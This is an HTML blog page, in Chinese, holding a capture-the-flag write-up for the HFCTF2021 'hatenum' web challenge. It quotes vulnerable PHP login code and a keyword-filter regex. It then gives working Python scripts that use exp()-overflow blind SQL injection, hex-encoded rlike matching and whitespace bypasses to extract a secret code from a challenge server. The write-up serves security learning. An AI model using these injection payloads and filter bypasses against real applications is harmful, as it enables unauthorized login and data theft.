@@ -1,0 +1,442 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>HFCTF2021-hatenum - Welcome to fallingblog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="这是五月份的题目了，但是一直没写wp，拿出来再水一遍，...">
+  <meta name="author" content="Ibukifalling">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">HFCTF2021-hatenum</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">HFCTF2021-hatenum</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>July 13, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>5978</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <p>这是五月份的题目了，但是一直没写wp，拿出来再水一遍，自己写一遍脚本，顺便总结一下知识点（</p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>附件直接给了源码，重点看SQL语句的部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$code</span></span>)</span>&#123;<br>		<span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;conn-&gt;error)&#123;<br>			<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable">$content</span> = <span class="hljs-variable">$res</span>-&gt;fetch_array();<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$content</span>[<span class="hljs-string">&#x27;code&#x27;</span>]===<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;<br>				<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$content</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>				<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;fail&#x27;</span>;<br>			&#125;<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>语句直接拼接，很容易想到SQL注入</p>
+<p>但是接着往下看，会发现写了waf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;	<br>	<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hack detected&#x27;</span>);<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>	<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="hljs-variable">$str</span>))&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Huge num detected&#x27;</span>);<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">array_waf</span>(<span class="hljs-params"><span class="hljs-variable">$arr</span></span>)</span>&#123;<br>	<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>		<span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$value</span>))&#123;<br>			array_waf(<span class="hljs-variable">$value</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			sql_waf(<span class="hljs-variable">$value</span>);<br>			num_waf(<span class="hljs-variable">$value</span>);<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>sql_waf过滤了一堆语法</p>
+<p>num_waf则过滤了大数字</p>
+<h2 id="如何注入"><a href="#如何注入" class="headerlink" title="如何注入"></a>如何注入</h2><p>先看看究竟过滤了哪些东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_match(<span class="hljs-string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="hljs-variable">$str</span>)<br>preg_match(<span class="hljs-string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="hljs-variable">$str</span>)<br></code></pre></td></tr></table></figure>
+
+<p>然后把login功能里面的查询语句拿出来单独看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>单引号过滤了，但是仔细一看没过滤\，构造username=name\可以把后面的单引号转义掉，然后再通过在password里加注释符达到万能密码的效果</p>
+<p>不过发现code是单独验证的，所以此处要通过注入来拿到code</p>
+<h3 id="溢出注入"><a href="#溢出注入" class="headerlink" title="溢出注入"></a>溢出注入</h3><p>顾名思义，通过溢出引发报错来进行注入</p>
+<p>虽然preg_match过滤掉了大数字，不过我们仍然可以通过exp函数来进行溢出</p>
+<blockquote>
+<p>exp(pow)返回e的pow次方</p>
+</blockquote>
+<p><strong>当exp()的参数大于709时就会造成溢出，报错</strong></p>
+<p><img    class="lazyload" data-original="/images/HFCTF2021hatenum/image-20210723110740140.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">回显login fail</span></p>
+<p><img    class="lazyload" data-original="/images/HFCTF2021hatenum/image-20210723110802255.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">回显error</span></p>
+<h3 id="获取code长度"><a href="#获取code长度" class="headerlink" title="获取code长度"></a>获取code长度</h3><p>既然exp()的参数大于709就会error，我们可以通过这个特性来获取code的长度。</p>
+<p>通过回显来间接得到length(code)的值，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><br>url=<span class="hljs-string">&quot;http://2332ef01-e3b2-4f52-b807-3f5a432dc457.node4.buuoj.cn/login.php&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getlen</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">99</span>):<br>        payload = <span class="hljs-string">&quot;||exp(%d-length(code))#&quot;</span>%(<span class="hljs-number">709</span>+i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;ibuki\\&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: payload,<br>            <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>        &#125;<br>        r = requests.post(url, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;fail&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code len:%d&quot;</span>%(i-<span class="hljs-number">1</span>))<br>            <span class="hljs-keyword">return</span><br><br>getlen() <br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="/images/HFCTF2021hatenum/image-20210723231501779.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">运行结果</span></p>
+<p>得到code长度为23</p>
+<h3 id="rlike语句"><a href="#rlike语句" class="headerlink" title="rlike语句"></a>rlike语句</h3><blockquote>
+<p>在MySQL中，RLIKE运算符用于确定字符串是否匹配正则表达式。它是REGEXP_LIKE()的同义词。 </p>
+<p>如果字符串与提供的正则表达式匹配，则结果为1，否则为0。</p>
+</blockquote>
+<p>此处我们可以构造password为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">password=||exp(<span class="hljs-number">710</span>-(code rlike xxx))<br></code></pre></td></tr></table></figure>
+
+<p>这样，当rlike语句成功匹配时会返回login fail，否则返回error</p>
+<h3 id="关于空格的绕过"><a href="#关于空格的绕过" class="headerlink" title="关于空格的绕过"></a>关于空格的绕过</h3><blockquote>
+<ul>
+<li><p>/**/</p>
+</li>
+<li><p>加括号</p>
+</li>
+<li><p>将空格变成换页键（chr(0x0c)）,换行符,tab键 。</p>
+</li>
+</ul>
+<p>本题可以通过chr(0x0c)绕过                                                   </p>
+<p>​                                                                                                                ——–by naman</p>
+</blockquote>
+<h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><p>通过binary语法将需要匹配的字符串转成十六进制形式即可</p>
+<h3 id="数字大小限制"><a href="#数字大小限制" class="headerlink" title="数字大小限制"></a>数字大小限制</h3><p>本题难点之一：不管是十六进制还是十进制数字，都不能达到9位。</p>
+<p>十六进制下按两位一个字符来算，也就是一次最多只能匹配四个字符，而code有23位，怎么解决这个问题呢？</p>
+<p>先通过构造’^xxx’匹配开头，可以得到开头的前三个字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><br>url=<span class="hljs-string">&quot;http://2332ef01-e3b2-4f52-b807-3f5a432dc457.node4.buuoj.cn/login.php&quot;</span><br>thelist=string.digits+string.ascii_uppercase+string.ascii_lowercase<span class="hljs-comment">#所有数字和字母</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hexer</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    ret=<span class="hljs-string">&#x27;0x&#x27;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        ret=ret+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(char))[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> ret<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guessstart</span>():</span><br>    guess=<span class="hljs-string">&#x27;^&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> thelist:<br>            payload=<span class="hljs-string">&quot;||exp(710-(code rlike binary &quot;</span>+hexer(guess+c)+<span class="hljs-string">&quot;))#&quot;</span><br>            payload=payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))<br><br>            data = &#123;<br>                            <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;ibuki\\&quot;</span>,<br>                            <span class="hljs-string">&quot;password&quot;</span>: payload,<br>                            <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>            &#125;<br><br>            r = requests.post(url,data=data,allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;fail&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                guess+=c<br>                <span class="hljs-built_in">print</span>(guess)<br>                <span class="hljs-keyword">continue</span><br><br>guessstart()<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="/images/HFCTF2021hatenum/image-20210723232746120.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">运行结果</span></p>
+<p>得到前三个字符erg</p>
+<p>然后这里的思路是，通过已有的三个字符，加上猜测的第四个字符，来进行匹配。不过稍微想一下就知道：因为只能得知是否匹配成功，不知道匹配成功的位置，所以这种匹配方式可能会出现多解。</p>
+<p>这里采用了枚举所有可能性的方法，即将每一步的可能性都存下来分别进行再次匹配，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><br>url=<span class="hljs-string">&quot;http://2332ef01-e3b2-4f52-b807-3f5a432dc457.node4.buuoj.cn/login.php&quot;</span><br>thelist=string.digits+string.ascii_uppercase+string.ascii_lowercase<span class="hljs-comment">#所有数字和字母</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">next</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    ret=[]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> thelist:<br>        payload = <span class="hljs-string">&quot;||exp(710-(code rlike binary &quot;</span> + hexer(<span class="hljs-built_in">str</span>[-<span class="hljs-number">3</span>:] + c) + <span class="hljs-string">&quot;))#&quot;</span><br>        payload = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;ibuki\\&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: payload,<br>            <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            r = requests.post(url, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;Too Many Requests&#x27;</span> <span class="hljs-keyword">in</span> r.text):<span class="hljs-comment">#实测发现请求太多容易出429，加了这个</span><br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;fail&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            ret.append(<span class="hljs-built_in">str</span>+c)<br><br>    <span class="hljs-keyword">return</span> ret<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getcode</span>():</span><br><br>    allthefates=[<span class="hljs-string">&#x27;erg&#x27;</span>]<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        nextfates=[]<br><br>        <span class="hljs-keyword">for</span> fate <span class="hljs-keyword">in</span> allthefates:<br>            possibility = <span class="hljs-built_in">next</span>(fate)<br><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> possibility:<br>                nextfates.append(i)<br><br>        allthefates=nextfates<br>        <span class="hljs-built_in">print</span>(allthefates)<br>        <br>getcode()<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img   class="lazyload" data-original="/images/HFCTF2021hatenum/image-20210723222241642.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>最后得到了三个code，试了一下，第一个就是对的</p>
+<p>利用万能密码和code登录后拿到flag</p>
+<p><img   class="lazyload" data-original="/images/HFCTF2021hatenum/image-20210723222431959.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>flag{44a15053-28e7-4e08-b076-53ac06b103c1}</p>
+<h1 id="感想和总结"><a href="#感想和总结" class="headerlink" title="感想和总结"></a>感想和总结</h1><p>当时和naman交流了一下思路之后看他打了一遍，感觉会了</p>
+<p>今天自己打一遍发现怎么这么多问题……</p>
+<p>比如用python来POST过去的话，换页符不能用%0c只能用chr(0x0c)</p>
+<p>比如一开始脚本爆不出来我还以为是我写错了，de了半天bug发现是请求过于频繁429了……</p>
+<p>SQL注入的脚本实在是没怎么写过，代码水平属于是很差了</p>
+<p>还是得多打点代码锻炼一下</p>
+
+      </section>
+      <section class="extra">
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/07/13/SSTIstudy/"><i class="iconfont iconleft"></i>flask模板注入</a>
+    <a href="/2021/07/12/fileReadwps/">文件读取漏洞专题-一道例题<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E8%A7%88"><span class="toc-text">总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B3%A8%E5%85%A5"><span class="toc-text">如何注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E6%B3%A8%E5%85%A5"><span class="toc-text">溢出注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96code%E9%95%BF%E5%BA%A6"><span class="toc-text">获取code长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rlike%E8%AF%AD%E5%8F%A5"><span class="toc-text">rlike语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">关于空格的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">单引号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6"><span class="toc-text">数字大小限制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%84%9F%E6%83%B3%E5%92%8C%E6%80%BB%E7%BB%93"><span class="toc-text">感想和总结</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
